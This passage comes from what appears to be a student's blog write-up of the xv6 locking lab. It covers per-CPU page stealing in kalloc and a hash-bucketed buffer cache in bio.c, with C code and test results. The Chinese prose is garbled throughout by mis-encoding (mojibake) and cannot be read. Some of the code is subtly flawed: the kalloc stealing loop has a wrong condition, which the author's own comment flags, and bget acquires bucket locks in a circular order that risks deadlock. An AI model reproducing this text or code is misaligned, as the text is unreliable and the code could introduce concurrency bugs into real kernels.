class="keyword">if</span>(!r)&#123;</span><br><span class="line">    <span class="comment">// stealing free pages from other CPU</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; NCPU &amp;&amp; i != id; i++)&#123;  <span class="comment">//ï¼ å¾ªç¯æ¡ä»¶é”™è¯¯</span></span><br><span class="line">      acquire(&amp;kmem[i].lock);</span><br><span class="line">      r = kmem[i].freelist;</span><br><span class="line">      <span class="keyword">if</span>(r)&#123;</span><br><span class="line">        kmem[i].freelist = r-&gt;next;</span><br><span class="line">        release(&amp;kmem[i].lock);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        release(&amp;kmem[i].lock);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/07/16/Lab-Locks/kalloctest_passed.png" alt="kalloctest_passed.png"></p><h1 id="buffer-cache"><a class="markdownIt-Anchor" href="#buffer-cache"></a> Buffer cache</h1><h2 id="rtfmbuffer-cache-å…¨å±€é”ç«äº‰"><a class="markdownIt-Anchor" href="#rtfmbuffer-cache-å…¨å±€é”ç«äº‰"></a> RTFMï¼šBuffer cache å…¨å±€é”ç«äº‰</h2><p>è¿™ä¸€ä¸ªå®éªŒæ¶‰åŠåˆ°æ–‡ä»¶ç³»ç»Ÿï¼Œå¯¹äºè¿™éƒ¨åˆ†çš„æºç æˆ‘ä»¬ç•™åˆ°åé¢çš„å®éªŒè¿›è¡Œåˆ†æï¼Œè¿™é‡Œåªä¸“æ³¨äº buffer cache layer å¤§æ¦‚åœ°ç†è§£ä»€ä¹ˆæ˜¯ <strong>buffer cache</strong>ã€‚</p><p>è¿›ç¨‹æƒ³è¦è®¿é—®ç£ç›˜ä¸Šçš„æ•°æ®ï¼Œæ— è®ºæ˜¯è¯»å–è¿˜æ˜¯å†™å…¥éƒ½æ— æ³•ç›´æ¥åœ¨ç£ç›˜ä¸Šè¿›è¡Œï¼Œåœ¨å†¯è¯ºä¾æ›¼æ¶æ„ä¸‹æˆ‘ä»¬åªèƒ½å…ˆå°†ç£ç›˜æ•°æ®â€œç¼“å†²â€åˆ°å†…å­˜é‡Œï¼ˆä»¥ block ä¸ºå•ä½ï¼‰ï¼Œè€Œ xv6 è®¾å®šäº†ä¸€å—å†…å­˜åŒºä¸“é—¨ç”¨äºç¼“å­˜è¿™äº›ç£ç›˜å—ï¼Œå°±æ˜¯ <strong>buffer cache</strong>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/bio.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> <span class="title">buf</span>[<span class="title">NBUF</span>];</span>  <span class="comment">// ç¼“å†²åŒºå¤§å°ä¸ºNBUF,å³å¯åŒæ—¶ç¼“å­˜NBUFä¸ªç£ç›˜å—</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// åŒå‘é“¾è¡¨ç”¨æ¥è¿æ¥bufferï¼Œå®ç°äº†ä¸€ä¸ªè¶…çº§ç®€å•è€Œå¥‡æ€ªçš„LRUæ›¿æ¢ç­–ç•¥</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> <span class="title">head</span>;</span></span><br><span class="line">&#125; bcache;</span><br></pre></td></tr></table></figure><p>buffer cache æä¾›ç»™ä¸Šå±‚çš„æ¥å£æœ‰ä¸¤ä¸ªï¼Œåˆ†åˆ«æ˜¯ <code>bread</code> æŠŠæŒ‡å®šçš„ block è¯»å–åˆ° buffer ä¸­ï¼›<code>bwrite</code> æŠŠå†…å­˜ä¸­ä¿®æ”¹çš„æ•°æ®å†™å›ç£ç›˜ block ã€‚</p><p>ä¸ºäº†é˜²æ­¢å¹¶å‘å†™å…¥åŒä¸€ä¸ª buffer å¯¼è‡´æ•°æ®ç«äº‰ï¼Œæºç ä¸­å¯¹äºæ¯ä¸ª buffer åŠ äº†ä¸€ä¸ªè‡ªæ—‹é”ï¼Œä¿è¯ buffer è¯»å†™çš„åŸå­æ€§ã€‚è€Œä¸ºäº†å®ç°ç¼“å­˜ä¸€è‡´æ€§ï¼Œæºç ä¸º buffer cache è¿™å—ç¼“å†²åŒºåŠ äº†ä¸€ä¸ª <code>bcache.lock</code> ï¼Œä¿è¯ <code>bcache</code> ç»´æŠ¤çš„åŒå‘é“¾è¡¨çš„æ•°æ®ä¸€è‡´æ€§ã€‚</p><p>æˆ‘ä»¬éœ€è¦æ³¨æ„å¯¹æ¯”å’Œä¸Šä¸€ä¸ªä»»åŠ¡ Memory alloctor çš„åŒºåˆ«ï¼â€œbcache buffers are <strong>truly shared</strong> among processes (and thus CPUs)â€ï¼Œå³è¿™ä¸ªç¼“å†²åŒºæ˜¯è¿›ç¨‹å…±æœ‰çš„ä¸€å—å†…å­˜åŒºåŸŸï¼Œè¦æƒ³è¯»å†™ç¡¬ç›˜æ–‡ä»¶å¿…é¡»å…ˆæŠŠæ–‡ä»¶è¯»å–åˆ° buffer cache é‡Œçš„ <code>buf[NBUF]</code>ï¼Œå³<strong>éœ€è¦åˆ†é…ä¸€ä¸ª buffer</strong> ã€‚è€Œ <code>kalloc</code>Â  å¤§éƒ¨åˆ†æƒ…å†µä¸‹<strong>åˆ†é…ä¸€ä¸ªç‰©ç†é¡µé¢</strong>ç»™æŸä¸ªè¿›ç¨‹ï¼Œåˆ°è¿™ä¸ªç‰©ç†é¡µè¢«é‡Šæ”¾ (<code>kfree</code>) ä¹‹å‰ï¼Œéƒ½å®Œå…¨å½’è¿™ä¸ªè¿›ç¨‹æ‰€æœ‰ï¼Œæ‰€ä»¥æˆ‘ä»¬ç»™æ¯ä¸ª CPU åˆ†é…ä¸€ä¸ªç§æœ‰çš„ alloctor èƒ½å‡å°‘ kmem é”ç«äº‰ã€‚</p><p>æ¯æ¬¡è¯»å–ç£ç›˜æ–‡ä»¶æ—¶ï¼Œè¿›ç¨‹éƒ½éœ€è¦è·å¾— <code>bcache.lock</code>ï¼Œå½“è®¸å¤šè¿›ç¨‹å¹¶å‘åœ°é«˜å¼ºåº¦è¯»å–æ–‡ä»¶æ—¶ï¼Œ <code>bcache.lock</code> çš„ç«äº‰å°±ä¼šå¾ˆæ¿€çƒˆï¼Œå¯¼è‡´äº† <code>acquire</code> çš„ç©ºè½¬ã€‚</p><p>buffer cache å¹¶å‘é€‚åº”æ€§å¼±çš„åŸå› åœ¨äºåªæœ‰ä¸€ä¸ªå•ç‹¬çš„ <code>bcache.lock</code> æ¥ä¿æŠ¤å…¨éƒ¨çš„ buffersï¼Œ <code>bget</code> ä¸ <code>brelse</code> çš„é«˜é¢‘è°ƒç”¨å°±ä¼šäº§ç”Ÿå¯¹ <code>bcache.lock</code> çš„é«˜åº¦ç«äº‰ï¼Œæˆ‘ä»¬éœ€è¦å¯¹ buffer cache çš„æ•°æ®ç»“æ„è¿›è¡Œè°ƒæ•´ï¼Œ<strong>ç»†åŒ–é”çš„ä¿æŠ¤èŒƒå›´</strong>ã€‚</p><h2 id="å“ˆå¸Œåˆ†åŒºå®ç°"><a class="markdownIt-Anchor" href="#å“ˆå¸Œåˆ†åŒºå®ç°"></a> å“ˆå¸Œåˆ†åŒºå®ç°</h2><blockquote><p>Modify the block cache so that the number ofÂ acquireÂ loop iterations for all locks in the bcache is close to zero when runningÂ bcachetest. Ideally the sum of the counts for all locks involved in the block cache should be zero, but itâ€™s OK if the sum is less than 500. <strong>ModifyÂ <code>bget</code>Â andÂ <code>brelse</code>Â so that concurrent lookups and releases for different blocks that are in the bcache are unlikely to conflict on locks</strong> (e.g., donâ€™t all have to wait forÂ bcache.lock).</p></blockquote><p>å‚è€ƒä¸Šä¸ªå®éªŒçš„â€œåˆ’åˆ†â€æ€æƒ³ï¼Œå¦‚æœæˆ‘ä»¬ä¹Ÿå¯ä»¥æŠŠè¿™äº› buffers åˆ’åˆ†ä¸ºä¸åŒåŒºåŸŸï¼Œæ¯ä¸ªåŒºåŸŸç”±ç‹¬ç«‹çš„è‡ªæ—‹é”ä¿æŠ¤ï¼Œå°±å¯ä»¥é™ä½æ–‡ä»¶è¯»å–æ—¶å¯¹äºé”çš„ç«äº‰ã€‚<strong>æ ¹æ®æç¤ºï¼Œæˆ‘é‡‡å–äº†å¯¹ <code>blockno</code> å“ˆå¸Œçš„æ–¹å¼åˆ’åˆ† buffers çš„ç­–ç•¥ï¼šå¯¹äºå“ˆå¸Œåˆ°åŒä¸€ä¸ª bucket ç£ç›˜å—ï¼Œæˆ‘ä»¬å…ˆåœ¨è¿™ä¸ªå“ˆå¸Œæ¡¶é‡Œçœ‹çœ‹æ˜¯å¦å·²ç»ç¼“å­˜äº†ï¼Œå¦‚æœæ²¡æœ‰ç¼“å­˜ï¼Œé‚£å°±æ‰¾ä¸€ä¸ªç©ºä½™çš„ <code>buf</code> ï¼ˆå³<code>b-&gt;refcnt == 0</code>ï¼‰ï¼Œé¢„å®šè¿™ä¸ª buffer ç”¨æ¥ç¼“å­˜æˆ‘ä»¬éœ€è¦è¯»å–çš„ç£ç›˜ blockã€‚</strong></p><p>æŒ‰ç…§æˆ‘ä»¬çš„ç­–ç•¥ä¿®æ”¹ buffer cache çš„æ•°æ®ç»“æ„ï¼Œä¸ºæ¯ä¸ª bucket åˆ†é…ä¸€æŠŠé”ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/bio.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bucket</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> <span class="title">head</span>;</span> <span class="comment">// æ¯ä¸ªbucketåŒæ ·ç»´æŠ¤ä¸€ä¸ªåŒå‘é“¾è¡¨</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span> <span class="comment">// bcacheé”å…¶å®æ²¡ä»€ä¹ˆç”¨äº†ï¼Œå¯ä»¥ä¸ç”¨ä¿ç•™</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> <span class="title">buf</span>[<span class="title">NBUF</span>];</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Divide NBUF buffer cache area into NBUCKET parts</span></span><br><span class="line">  <span class="comment">// by simple hashing algorithm.</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">bucket</span> <span class="title">buckets</span>[<span class="title">NBUCKET</span>];</span></span><br><span class="line">&#125; bcache;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">hashing</span><span class="params">(uint blockno)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> blockno % NBUCKET; <span class="comment">// å“ˆå¸Œç®—æ³•ï¼šç®€å•åœ°å–blocknoçš„ä½™æ•°</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆå§‹åŒ– buffer cacheï¼Œé¦–å…ˆä¸ºæ¯ä¸ª bucket åˆå§‹åŒ–ç§æœ‰çš„è‡ªæ—‹é” <code>bcache_[id]</code> ï¼Œç„¶ååˆå§‹åŒ– bucket ç»´æŠ¤çš„åŒå‘é“¾è¡¨ï¼Œè¿™é‡Œå¹³å‡åœ°æŠŠ <code>buf</code> åˆ†é…åˆ°æ¯ä¸ª bucket é‡Œäº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/bio.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">binit</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">b</span>;</span></span><br><span class="line">  <span class="type">char</span> lock_name[<span class="number">8</span>];   <span class="comment">//ï¼æ½œåœ¨é—®é¢˜</span></span><br><span class="line"></span><br><span class="line">  initlock(&amp;bcache.lock, <span class="string">&quot;bcache&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NBUCKET; i++) &#123;  <span class="comment">// NBUCKETå®šä¹‰ä¸ºäº†13ï¼ˆæˆ–å…¶ä»–è´¨æ•°ï¼‰</span></span><br><span class="line">    <span class="built_in">snprintf</span>(lock_name, <span class="keyword">sizeof</span>(lock_name), <span class="string">&quot;bcache_%d&quot;</span>, i);</span><br><span class="line">    initlock(&amp;bcache.buckets[i].lock, lock_name);</span><br><span class="line">    bcache.buckets[i].head.next = &amp;bcache.buckets[i].head;</span><br><span class="line">    bcache.buckets[i].head.prev = &amp;bcache.buckets[i].head;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// initialize hash buckets</span></span><br><span class="line">  <span class="type">int</span> id;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; NBUF; i++)&#123;</span><br><span class="line">    id = i % NBUCKET;</span><br><span class="line">    b = &amp;bcache.buf[i];</span><br><span class="line">    b-&gt;next = bcache.buckets[id].head.next;</span><br><span class="line">    b-&gt;prev = &amp;bcache.buckets[id].head;</span><br><span class="line">    bcache.buckets[id].head.next-&gt;prev = b;</span><br><span class="line">    bcache.buckets[id].head.next = b;</span><br><span class="line"></span><br><span class="line">    initsleeplock(&amp;b-&gt;lock, <span class="string">&quot;buffer&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åé¢æ ¹æ®æˆ‘ä»¬çš„ç­–ç•¥å®ç° <code>bget</code> çš„é€»è¾‘ï¼Œå…¶å®å°±æ˜¯æ ¹æ®æˆ‘ä»¬ä¿®æ”¹çš„æ•°æ®ç»“æ„ä¿®æ”¹åŸæœ¬çš„ä¸¤ä¸ªåˆ¤æ–­ï¼šå·²ç»ç¼“å­˜åˆ° buffer é‡Œäº†ï¼Œå°±ç›´æ¥è¿”å›å¸¦ sleep-lock çš„ bufferï¼›æ²¡æœ‰ç¼“å­˜ï¼Œåˆ™åœ¨æ˜ å°„çš„å“ˆå¸Œæ¡¶é‡Œæ‰¾ä¸€ä¸ªæ²¡æœ‰ä½¿ç”¨çš„ buffer ï¼›å¦‚æœå“ˆå¸Œæ¡¶é‡Œæ²¡æœ‰ç©ºä½™çš„ bufferï¼Œåˆ™åƒä¸Šä¸ªä»»åŠ¡ä¸€æ ·åœ¨å…¶ä»–çš„å“ˆå¸Œæ¡¶é‡Œæ‹¿ä¸€ä¸ªæ²¡æœ‰ç”¨çš„ bufferï¼Œè¿™é‡Œé‡‡å–çš„åŠæ³•æ˜¯<strong>çº¿æ€§éå†æ¯ä¸ªæ¡¶</strong>ã€‚</p><p>å¯¹äºæœ€åä¸€ç§æƒ…å†µæˆ‘ä»¬éœ€è¦åœ¨æ–°æ—§ä¸¤ä¸ª bucket ç»´æŠ¤çš„é“¾è¡¨é—´ç§»åŠ¨ buffer ï¼Œä¹Ÿå°±éœ€è¦åŒæ—¶æŒæœ‰è¿™ä¸¤ä¸ª bucket çš„é”ï¼ŒåŒæ—¶è¦æ³¨æ„é‡Šæ”¾é¡ºåºä»¥é¿å… dead lockã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/bio.c</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> buf* <span class="title function_">bget</span><span class="params">(uint dev, uint blockno)</span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">b</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">unused</span> =</span> <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> hash;</span><br><span class="line">  hash = hashing(blockno);</span><br><span class="line"></span><br><span class="line">  acquire(&amp;bcache.buckets[hash].lock);</span><br><span class="line">  <span class="comment">// Is the block already cached in that bucket?</span></span><br><span class="line">  <span class="keyword">for</span>(b = bcache.buckets[hash].head.next; b != &amp;bcache.buckets[hash].head; b = b-&gt;next)&#123;</span><br><span class="line">    <span class="keyword">if</span>(b-&gt;dev == dev &amp;&amp; b-&gt;blockno == blockno)&#123;</span><br><span class="line">      b-&gt;refcnt++;</span><br><span class="line">      release(&amp;bcache.buckets[hash].lock);</span><br><span class="line">      acquiresleep(&amp;b-&gt;lock);</span><br><span class="line">      <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(b-&gt;refcnt == <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="comment">// record the unused buffer</span></span><br><span class="line">      unused = b;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Not cached, but find an unused buffer in the same bucket.</span></span><br><span class="line">  <span class="keyword">if</span>(unused != <span class="number">0</span>)&#123;</span><br><span class="line">unused:</span><br><span class="line">    b = unused;</span><br><span class="line">    b-&gt;dev = dev;</span><br><span class="line">    b-&gt;blockno = blockno;</span><br><span class="line">    b-&gt;valid = <span class="number">0</span>;</span><br><span class="line">    b-&gt;refcnt = <span class="number">1</span>;</span><br><span class="line">    release(&amp;bcache.buckets[hash].lock);</span><br><span class="line">    acquiresleep(&amp;b-&gt;lock);</span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// try to find an unused buffer globally</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> bucketno = (hash+<span class="number">1</span>)%NBUCKET; bucketno != hash; bucketno = (bucketno+<span class="number">1</span>)%NBUCKET)&#123;</span><br><span class="line">    acquire(&amp;bcache.buckets[bucketno].lock);</span><br><span class="line">    <span class="comment">// traverse the different bucket to find a buffer</span></span><br><span class="line">    <span class="keyword">for</span>(b = bcache.buckets[bucketno].head.next; b != &amp;bcache.buckets[bucketno].head; b = b-&gt;next)&#123;</span><br><span class="line">      <span class="keyword">if</span>(b-&gt;refcnt == <span class="number">0</span>)&#123;</span><br><span class="line">        unused = b;</span><br><span class="line">        <span class="comment">// remove b from buckets[bucketno]</span></span><br><span class="line">        b-&gt;prev-&gt;next = b-&gt;next;</span><br><span class="line">        b-&gt;next-&gt;prev = b-&gt;prev;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// move b to buckets[hash]</span></span><br><span class="line">        b-&gt;next = bcache.buckets[hash].head.next;</span><br><span class="line">        b-&gt;prev = &amp;bcache.buckets[hash].head;</span><br><span class="line">        bcache.buckets[hash].head.next-&gt;prev = b;</span><br><span class="line">        bcache.buckets[hash].head.next = b;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ³¨æ„é¡ºåºé‡Šæ”¾ï¼Œé¿å…æ­»é”</span></span><br><span class="line">        release(&amp;bcache.buckets[bucketno].lock);</span><br><span class="line">        <span class="keyword">goto</span> unused;</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    release(&amp;bcache.buckets[bucketno].lock);</span><br><span class="line">  &#125;</span><br><span class="line">  release(&amp;bcache.buckets[hash].lock);</span><br><span class="line"></span><br><span class="line">  panic(<span class="string">&quot;bget: no buffers&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºå®éªŒè¯´æˆ‘ä»¬å¯ä»¥ä¸ç”¨å®ç° LRUï¼Œé‚£ä¹ˆ <code>brelse</code> çš„é‡Šæ”¾é€»è¾‘å°±éå¸¸ç®€å•äº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/bio.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">brelse</span><span class="params">(<span class="keyword">struct</span> buf *b)</span>&#123;</span><br><span class="line">  <span class="type">int</span> hash;</span><br><span class="line">  <span class="keyword">if</span>(!holdingsleep(&amp;b-&gt;lock))</span><br><span class="line">    panic(<span class="string">&quot;brelse&quot;</span>);</span><br><span class="line"></span><br><span class="line">  releasesleep(&amp;b-&gt;lock);</span><br><span class="line"></span><br><span class="line">  hash = hashing(b-&gt;blockno);</span><br><span class="line">  acquire(&amp;bcache.buckets[hash].lock);</span><br><span class="line">  b-&gt;refcnt--;  <span class="comment">// æ— éœ€å¯¹bufferè¿›è¡Œç§»åŠ¨</span></span><br><span class="line">  release(&amp;bcache.buckets[hash].lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¸å¿ƒé€»è¾‘ä¿®æ”¹å®Œæ¯•ï¼Œæµ‹è¯•ä¸€ä¸‹ç»“æœï¼š<br><img src="/2025/07/16/Lab-Locks/ilock_panic.png" alt="ilock_panic.png"></p><p>æ¥è‡ª <code>ilock</code> çš„ panicï¼Œä½†æ˜¯æˆ‘æ ¹æœ¬æ²¡æœ‰è¯» xv6 æ–‡ä»¶ç³»ç»Ÿç›¸å…³çš„æºç ï¼Œä¸æ¸…æ¥šå…·ä½“çš„å®ç°é€»è¾‘ã€‚debug åå‘ç°é—®é¢˜å‡ºåœ¨ <code>bread</code> è°ƒç”¨ <code>virtio_disk_rw(b,0)</code> æŠŠç£ç›˜æ•°æ®å—å†™å…¥ buffer ä¸­ï¼Œè¯»å–å‰å <code>b-&gt;data</code> éƒ½æ˜¯ 0ã€‚<br><img src="/2025/07/16/Lab-Locks/debug.png" alt="debug.png"></p><p>ä¸æ–­æ£€æŸ¥ä¸ debug ï¼Œæœ€ååœ¨ Gemini çš„å®¡æŸ¥ä¸‹å‘ç°æ˜¯æˆ‘çš„ <code>snprintf</code> å­˜åœ¨æå…¶ç»†å¾®çš„é—®é¢˜å¯¼è‡´çš„è´è¶æ•ˆåº”ã€‚ï¼ˆæˆ‘åªè¯´ä¸€å¥ï¼ŒGemini å¤§äººç¥å¨ TATï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/bio.c: binit()</span></span><br><span class="line">  <span class="comment">//ï¼&quot;bcache_10\0&quot;æœ‰åä¸ªå­—èŠ‚ï¼Œè¶…å‡ºæ•°ç»„å¤§å°</span></span><br><span class="line">  <span class="comment">// è¿™æ®µåˆå§‹åŒ–lockåå­—æ˜¯æˆ‘ç›´æ¥ä»ä¸Šä¸ªä»»åŠ¡æŠ„ä¸‹æ¥çš„ï¼Œæ²¡æƒ³åˆ°kmemå˜bcacheå‡ºäº†é—®é¢˜ã€‚ã€‚</span></span><br><span class="line">  <span class="type">char</span> lock_name[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">  initlock(&amp;bcache.lock, <span class="string">&quot;bcache&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NBUCKET; i++) &#123;</span><br><span class="line">    <span class="built_in">snprintf</span>(lock_name, <span class="keyword">sizeof</span>(lock_name), <span class="string">&quot;bcache_%d&quot;</span>, i);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>è°ƒæ•´æ•°ç»„å¤§å°åé€šè¿‡æµ‹è¯•ï¼š<br><img src="/2025/07/16/Lab-Locks/bcachetest.png" alt="bcachetest.png"><br><img src="/2025/07/16/Lab-Locks/grade.png" alt="grade.png"></p><p>åé¢æˆ‘åˆæƒ³äº†æƒ³æ•°ç»„çš„æº¢å‡ºå¯èƒ½å½±å“åˆ°æ ˆå¸§ä¸Šå…¶ä»–å˜é‡çš„å€¼ï¼Œæœ€å¤šæœ€å¤šå½±å“åˆ°è¿”å›åœ°å€æˆ–æ—§çš„æ ˆæŒ‡é’ˆï¼Œä½†å¦‚æœæ˜¯åè€…å¯èƒ½ä¼šå› ä¸ºè®¿é—®éæ³•åœ°å€ç›´æ¥å†…æ ¸çš„ panicï¼Œä¸ä¼šç»§ç»­å¾€ä¸‹æ‰§è¡Œåˆ° initcode çš„ <code>exec</code> äº†ã€‚å›é¡¾äº†ä¸€ä¸‹æˆ‘çš„æ“ä½œï¼Œilock panic å¾ˆå¯èƒ½æ˜¯æˆ‘æ­£ç¡®å®ç°å®Œä¹‹åæ²¡æœ‰ <code>make clean</code> å¯¼è‡´äº†ä¸€äº›é”™è¯¯æ–‡ä»¶çš„æ®‹ç•™ï¼ˆå…·ä½“ä¸æ¸…æ¥š Makefile æ˜¯æ€ä¹ˆå†™çš„ï¼Œæˆ‘ä¹Ÿçœ‹ä¸æ‡‚ï¼‰ï¼Œæˆ‘å®é™…ä¹Ÿåªæ˜¯å¬äº† Gemini è¯´çš„å» clean ä¸€ä¸‹æ„å»ºç»“æœï¼Œå†æ¬¡ build å°±æˆåŠŸäº†ã€‚æ—¢ç„¶é€šè¿‡äº†ä¹Ÿå°±ä¸å»çº ç»“è¿™ä¸ªé”™è¯¯æ˜¯æ€ä¹ˆäº§ç”Ÿçš„äº†ï¼Œå› ä¸ºæˆ‘ç”šè‡³æ— æ³•å¤ç°è¿™ä¸ª panic ã€‚</p><h2 id="ä¼˜åŒ–æ€è€ƒ"><a class="markdownIt-Anchor" href="#ä¼˜åŒ–æ€è€ƒ"></a> ä¼˜åŒ–æ€è€ƒ</h2><p><strong>å…³äº <code>bget</code> æŸ¥æ‰¾ç©ºé—² buffer çš„ä¼˜åŒ–è®¨è®ºï¼š</strong></p><p>å¦‚æœå¯¹åº”çš„å“ˆå¸Œæ¡¶æ²¡æœ‰ <code>refcnt</code> ä¸º 0 çš„ bufferï¼Œç”±äºå“ˆå¸Œåˆ†åŒºçš„å±€é™æ€§ï¼Œæˆ‘ä»¬æ— æ³•èŒƒå›´æœç´¢ï¼Œåªèƒ½çº¿æ€§åœ°å»éå†æ¯ä¸€ä¸ªå“ˆå¸Œæ¡¶æ‹¿ä¸€ä¸ª buffer 